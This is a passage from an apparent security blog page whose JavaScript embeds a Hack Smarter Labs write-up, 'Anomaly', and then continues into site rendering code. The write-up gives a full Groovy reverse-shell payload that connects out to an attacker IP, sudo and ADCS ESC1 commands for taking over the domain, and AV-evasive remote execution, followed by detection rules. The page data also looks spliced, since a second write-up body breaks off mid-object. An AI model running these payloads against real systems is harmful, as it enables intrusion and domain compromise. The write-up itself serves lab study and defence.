  {
    id: "anomaly",
    title: "Anomaly: Jenkins to Domain Admin via ESC1",
    date: "2026-06-26",
    platform: "Hack Smarter Labs",
    difficulty: "Medium",
    author: "0xz3r0",
    summary: "Default Jenkins credentials lead to a reverse shell on a web server, a privileged router configuration binary hands over root, and a Kerberos keytab pivot enables an ADCS ESC1 attack for Domain Admin on the DC.",
    tags: ["Jenkins", "Linux", "PrivEsc", "Kerberos", "ADCS", "ESC1", "AV Evasion"],
    link: { title: "Hack Smarter Labs: Anomaly", url: "https://www.hacksmarter.org/" },
    body: `
      <h2>Overview</h2>
      <p>Anomaly is a two-host Active Directory lab. The external web server and the domain controller sit on separate subnets, requiring a pivot after the initial foothold. The path starts with default Jenkins credentials, escalates to root on the web server, extracts a Kerberos keytab, moves laterally to the DC, and abuses an ADCS ESC1 misconfiguration to achieve Domain Admin.</p>

      <h2>Recon</h2>
      <p>Scanning the web server reveals only two exposed services: SSH on port 22 and Jetty on port 8080.</p>
      <div class="code-wrap">
        <pre><code class="language-bash">rustscan -a 10.1.67.252 -- -A</code></pre>
      </div>
      <p>Port 8080 hosts a Jenkins instance. The target's internal DC (<code>10.1.130.2</code>) has SMB exposed but blocks null authentication enumeration.</p>

      <h2>Initial Access</h2>
      <p>Attempting default credentials against the Jenkins login portal yields immediate success with <code>admin:admin</code>.</p>
      <figure>
        <img src="images/anomaly-jenkins-login.png" alt="Jenkins login portal">
        <figcaption>Figure 1: Jenkins login portal.</figcaption>
      </figure>
      <p>With administrative access to Jenkins, the Script Console provides arbitrary Groovy execution. I used a standard reverse shell payload to catch a callback on the host.</p>
      <div class="code-wrap">
        <pre><code class="language-java">String host="10.200.67.140";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();
  Thread.sleep(50);
  try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();s.close();</code></pre>
      </div>
      <figure>
        <img src="images/anomaly-jenkins-shell.png" alt="Jenkins Script Console execution">
        <figcaption>Figure 2: Script Console execution as the Jenkins service account.</figcaption>
      </figure>
      <p>The callback returns a shell as the <code>jenkins</code> user.</p>

      <h2>Privilege Escalation</h2>
      <p>Enumerating the local user's sudo permissions reveals a custom utility allowed to run without a password:</p>
      <div class="code-wrap">
        <pre><code class="language-bash">sudo -l</code></pre>
      </div>
      <figure>
        <img src="images/anomaly-sudo-l.png" alt="Sudo permissions for the jenkins user">
        <figcaption>Figure 3: <code>sudo -l</code> output showing the NOPASSWD entry.</figcaption>
      </figure>
      <p>The <code>router_config</code> binary passes its argument to a shell without sanitization. Invoking it with an interactive shell binary provides root access:</p>
      <div class="code-wrap">
        <pre><code class="language-bash">sudo /usr/bin/router_config /bin/sh</code></pre>
      </div>
      <figure>
        <img src="images/anomaly-router-config-root.png" alt="Root shell obtained via router_config">
        <figcaption>Figure 4: Abusing <code>router_config</code> for a root shell.</figcaption>
      </figure>

      <h2>Enumeration</h2>
      <p>With root access on the web server, I established persistence via an SSH key, then began searching for paths to the domain controller. Reading the Kerberos configuration and checking for keytab files yielded <code>/etc/krb5.keytab</code>.</p>
      <p>Using KeyTabExtract, I pulled an AES-256 hash for the service principal <code>Brandon_Boyd</code>. Importing this into a credential cache allowed authentication to the DC over LDAP.</p>
      <div class="code-wrap">
        <pre><code class="language-bash">python3 keytabextract.py krb5.keytab
nxc ldap anomaly.hsm -u brandon_boyd -k --use-kcache --users</code></pre>
      </div>
      <p>Dumping the LDAP users revealed a critical misconfiguration: the password for <code>Brandon_Boyd</code> was stored in cleartext in the Description field. Validating this password over SMB provided authenticated access to the domain.</p>

      <h2>Domain Admin</h2>
      <p>BloodHound collection from the authenticated context showed no direct path to Domain Admin. However, certipy-ad enumerated Active Directory Certificate Services (ADCS) and identified a vulnerable template named <code>CertAdmin</code>.</p>
      <p>The template is vulnerable to ESC1 (Enrollee supplies subject and allows client authentication) and ESC4 (dangerous ACL permissions). Because <code>Domain Computers</code> have enrollment rights, I created a new machine account and requested a certificate impersonating the Domain Admin user <code>Anna_Molly</code>.</p>
      <div class="code-wrap">
        <pre><code class="language-bash">impacket-addcomputer 'anomaly.hacksmarter/brandon_boyd:&lt;PASSWORD&gt;' -dc-ip 10.1.130.2 -computer-name 'zero' -computer-pass '&lt;NEW_PASSWORD&gt;'
certipy-ad req -u 'zero$' -p '&lt;NEW_PASSWORD&gt;' -dc-ip 10.1.130.2 -target 'anomaly.hsm' -ca 'anomaly-ANOMALY-DC-CA-2' -template 'CertAdmin' -upn 'Anna_Molly@anomaly.hsm' -sid 'S-1-5-21-1496966362-3320961333-4044918980-1105'</code></pre>
      </div>
      <p>Authenticating with the resulting PFX file returned the NT hash for <code>Anna_Molly</code>. Standard Impacket tools like <code>psexec</code> and <code>wmiexec</code> were blocked by the endpoint AV. Using an obfuscated WMI execution wrapper (WMIExec2) bypassed the signature detection and provided a shell as Domain Admin.</p>
      <div class="code-wrap">
        <pre><code class="language-bash">certipy-ad auth -pfx 'anna_molly.pfx' -dc-ip 10.1.130.2
python3 wmiexec2.py 'anomaly.hsm/anna_molly'@anomaly.hsm -hashes '&lt;NT_hash&gt;' -shell-type powershell</code></pre>
      </div>
      <p>The final flag was located on the Administrator desktop.</p>

      <h2>Tools</h2>
      <div class="table-wrap">
        <table>
          <thead><tr><th>Tool</th><th>Purpose</th></tr></thead>
          <tbody>
            <tr><td>RustScan / Nmap</td><td>Port and service discovery</td></tr>
            <tr><td>Jenkins Script Console</td><td>Groovy reverse shell execution</td></tr>
            <tr><td>KeyTabExtract</td><td>Extract AES keys from krb5.keytab</td></tr>
            <tr><td>NetExec</td><td>LDAP enumeration and SMB validation</td></tr>
            <tr><td>Certipy-ad</td><td>ADCS enumeration and ESC1 exploitation</td></tr>
            <tr><td>Impacket</td><td>addcomputer and credential extraction</td></tr>
            <tr><td>WMIExec2</td><td>AV-evasive remote execution</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Detection Rules</h2>
      <ul>
        <li>Jenkins authentication with default credentials (<code>admin:admin</code>). Monitor CI/CD logs for successful logins originating from unusual IPs.</li>
        <li>Execution of <code>/bin/bash</code> or <code>/bin/sh</code> as a child process of the Jenkins Java process.</li>
        <li>Use of <code>sudo</code> against custom binaries (like <code>router_config</code>) that spawn shells. Monitor command-line arguments passed to NOPASSWD utilities.</li>
        <li>Reading <code>/etc/krb5.keytab</code> or <code>/etc/shadow</code> by the Jenkins service account.</li>
        <li>LDAP attributes containing passwords. Alert on any Description fields matching common password patterns.</li>
        <li>Creation of computer accounts by non-machine users (e.g., <code>Brandon_Boyd</code> creating <code>zero$</code>).</li>
        <li>ADCS certificate requests where the UPN does not match the requesting account (ESC1).</li>
        <li>Remote WMI execution spawning PowerShell from a Domain Admin context.</li>
      </ul>
    `

    body: `
      <h2>Overview</h2>
      <p>ShareThePain is a Hack Smarter Labs machine on <code>hack.smarter</code>. Starting from zero credentials, guest access to a writable SMB share gives us a hash capture, a BloodHound-driven password reset, an MSSQL instance bound to loopback, and SeImpersonatePrivilege abused for local administrator on DC01.</p>

  `;
}

/* ---------- Views ---------- */
function projectCard(p) {
  return `
    <div class="card">
      <div class="kicker">${esc(p.date)} · ${esc(p.category)}</div>
      <h3>${esc(p.title)}</h3>
      <p>${esc(p.summary)}</p>
      ${tagsHTML(p.tags)}
      ${p.repo ? `<a class="more" href="${esc(p.repo)}">Source →</a>` : ""}
    </div>`;
}

function viewHome() {
  const writeups = WRITEUPS.length
    ? `<div class="cards">${WRITEUPS.map(w => `
        <div class="card">
          <div class="kicker">${esc(w.platform)} · ${esc(w.difficulty)} · ${esc(w.date)}</div>
          <h3><a href="#writeup/${esc(w.id)}">${esc(w.title)}</a></h3>
          <p>${esc(w.summary)}</p>
          <a class="more" href="#writeup/${esc(w.id)}">Read →</a>
        </div>`).join("")}</div>`
    : emptyMsg("No write-ups yet.");

  const projects = PROJECTS.length
    ? `<div class="cards">${PROJECTS.slice(0, 3).map(projectCard).join("")}</div>`
    : emptyMsg("No projects yet.");

  return `
    <h1>Writeups</h1>
    <p class="lead">Projects, CTF and lab write-ups, and notes on breaking things so they stay fixed. Pick a write-up from the sidebar.</p>
    <h2>Latest write-ups</h2>
    ${writeups}
    <h2>Recent projects</h2>
    ${projects}
  `;
}

function viewProjects() {
  const cats = ["all", ...new Set(PROJECTS.map(p => p.category))];
  const list = PROJECTS.filter(p => projectFilter === "all" || p.category === projectFilter);
  const body = list.length
    ? `<div class="cards">${list.map(projectCard).join("")}</div>`
    : emptyMsg(PROJECTS.length ? "No projects in this category yet." : "No projects yet.");
  return `
    <h1>Projects</h1>
    <p class="lead">Tools, labs and experiments.</p>
    <div class="filters">
      ${cats.map(c => `<button class="filter-btn ${c === projectFilter ? "on" : ""}" data-cat="${esc(c)}">${esc(c)}</button>`).join("")}
    </div>
    ${body}
  `;
}

function viewResearch() {
  const body = RESEARCH.length
    ? `<div class="cards">${RESEARCH.map(r => `
        <div class="card">
          <div class="kicker">${esc(r.date)}</div>
          <h3><a href="#research/${esc(r.id)}">${esc(r.title)}</a></h3>
          <p>${esc(r.summary)}</p>
          <a class="more" href="#research/${esc(r.id)}">Read →</a>
        </div>`).join("")}</div>`
    : emptyMsg("No research posts yet.");
  return `
    <h1>Research</h1>
    <p class="lead">Longer posts on techniques, tooling and observations from lab work.</p>
    ${body}
  `;
}

function viewContact() {
  const links = CONTACT_LINKS.length
    ? `<div class="about-links">${CONTACT_LINKS.map(l => `<a href="${esc(l.url)}">${esc(l.label)}</a>`).join("")}</div>`
    : emptyMsg("No contact links yet.");
  return `
    <h1>Contact</h1>
    <p class="lead">Add your preferred links below, or an email address you're happy to share publicly.</p>
    ${links}
  `;
}

function viewArticle(kind, item) {
  const isWriteup = kind === "writeup";
  const crumb = isWriteup
    ? `${esc(item.platform)} / ${esc(item.date)}`
    : `Research / ${esc(item.date)}`;

  const linkCard = isWriteup && item.link ? `
    <a class="link-card" href="${esc(item.link.url)}">
      <div>
        <div class="lc-title">${esc(item.link.title)}</div>
        <div class="lc-url">${esc(item.link.url.replace(/^https?:\/\//, "").replace(/\/$/, ""))}</div>
      </div>
      <span class="chev">›</span>
    </a>` : "";

  const subtitle = isWriteup ? `${esc(item.difficulty)} · by ${esc(item.author)}` : `by ${esc(item.author)}`;

  const summaryBlock = !isWriteup
    ? `<details class="summary-box" open><summary>Summary</summary><div>${esc(item.summary)}</div></details>`
    : "";

  return `
    <div class="article-top">
      <div class="crumbs"><a href="#${isWriteup ? "home" : "research"}">${isWriteup ? "Writeups" : "Research"}</a> &nbsp;›&nbsp; ${crumb}</div>
      <div class="page-actions"><button class="btn-copy" id="copy-link">Copy link</button></div>
    </div>
    <h1>${esc(item.title)}</h1>
    <p class="subtitle">${subtitle}</p>
    ${tagsHTML(item.tags)}
    ${linkCard}
    ${summaryBlock}
    <div class="article-body">${item.body}</div>
    <div class="article-footer">
      <span style="color:var(--muted)">Last updated ${esc(item.date)}</span>
      <a href="#${isWriteup ? "home" : "research"}">← Back</a>
    </div>
  `;
}

/* ---------- Enhancements ---------- */
function addCopyButtons(root) {
  root.querySelectorAll("pre").forEach(pre => {
    if (pre.querySelector(".copy-btn")) return;
    const btn = document.createElement("button");
    btn.className = "copy-btn";
    btn.textContent = "Copy";
    btn.addEventListener("click", async () => {
      try { await navigator.clipboard.writeText(pre.innerText); btn.textContent = "Copied"; }
      catch (_) { btn.textContent = "Failed"; }
      setTimeout(() => (btn.textContent = "Copy"), 1500);
    });
    pre.appendChild(btn);
  });
}

function wireCopyLink() {
  const b = document.getElementById("copy-link");
  if (!b) return;
  b.addEventListener("click", async () => {
    try { await navigator.clipboard.writeText(location.href); b.textContent = "Copied"; }
    catch (_) { b.textContent = "Failed"; }
    setTimeout(() => (b.textContent = "Copy link"), 1500);
  });
}

function buildToc(root) {
  const tocEl = $("#toc");
  const heads = root.querySelectorAll(".article-body h2, .article-body h3");
  if (!heads.length) { tocEl.innerHTML = ""; return; }
  heads.forEach((h, i) => { if (!h.id) h.id = "sec-" + i; });
  tocEl.innerHTML = `<div class="toc-title">On this page</div>` +
    Array.from(heads).map(h =>
      `<a class="${h.tagName.toLowerCase()}" data-target="${h.id}" href="#${h.id}">${esc(h.textContent)}</a>`
    ).join("");
}

function highlightToc() {
  const links = document.querySelectorAll("#toc a");
  if (!links.length) return;
  let current = null;
  links.forEach(a => {
    const el = document.getElementById(a.dataset.target);
    if (el && el.getBoundingClientRect().top <= 120) current = a.dataset.target;
  });
  links.forEach(a => a.classList.toggle("current", a.dataset.target === current));
}

/* ---------- Render ---------- */
function render() {
  const route = parseRoute();
  renderTopNav(route);
  renderSidebar(route);

  const main = $("#main");
  let html;
  switch (route.view) {
    case "writeup": html = viewArticle("writeup", route.item); break;
    case "research": html = viewArticle("research", route.item); break;
    case "projects": html = viewProjects(); break;
    case "researchList": html = viewResearch(); break;
    case "about":   html = ABOUT_HTML; break;
    case "contact": html = viewContact(); break;
    default:        html = viewHome();
  }
  main.innerHTML = html;

  if (route.view === "writeup" || route.view === "research") {
    buildToc(main);
    wireCopyLink();
  } else {
    $("#toc").innerHTML = "";
  }
  addCopyButtons(main);
  window.scrollTo({ top: 0 });
  $("#side").classList.remove("open");
}

/* ---------- Events ---------- */
document.addEventListener("click", e => {
  const filter = e.target.closest("[data-cat]");
  if (filter) { projectFilter = filter.dataset.cat; render(); }
});

$("#search").addEventListener("input", e => {
  searchQuery = e.target.value;
  renderSidebar(parseRoute());
});

$("#menu-btn").addEventListener("click", () => $("#side").classList.toggle("open"));

$("#toc").addEventListener("click", e => {
  const a = e.target.closest("a[data-target]");
  if (!a) return;
  e.preventDefault();
  const el = document.getElementById(a.dataset.target);
  if (el) el.scrollIntoView({ behavior: "smooth", block: "start" });
});
window.addEventListener("hashchange", render);
window.addEventListener("scroll", highlightToc, { passive: true });

render();
</script>
</body>
</html>
